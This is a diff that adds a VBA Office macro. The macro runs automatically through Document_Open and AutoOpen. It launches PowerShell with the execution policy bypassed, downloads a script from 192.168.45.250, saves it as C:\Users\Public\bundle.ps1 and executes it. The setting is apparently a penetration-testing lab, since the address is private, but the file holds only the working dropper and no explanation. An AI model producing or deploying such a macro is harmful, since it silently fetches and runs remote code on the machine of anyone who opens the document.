@@ -1,0 +1,25 @@
+Sub MyMacro()
+    Dim str As String
+    str = "powershell.exe -ep bypass iwr -usebasicparsing http://192.168.45.250/bundle.txt -outfile C:\Users\Public\bundle.ps1"
+    str2 = "powershell -ep bypass -file C:\Users\Public\bundle.ps1"
+    Shell str
+    Shell str2
+    Wait (10)
+End Sub
+
+
+Sub Document_Open()
+    MyMacro
+End Sub
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Wait(n As Long)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+    Loop Until Now >= DateAdd("s", n, t)
+
+End Sub
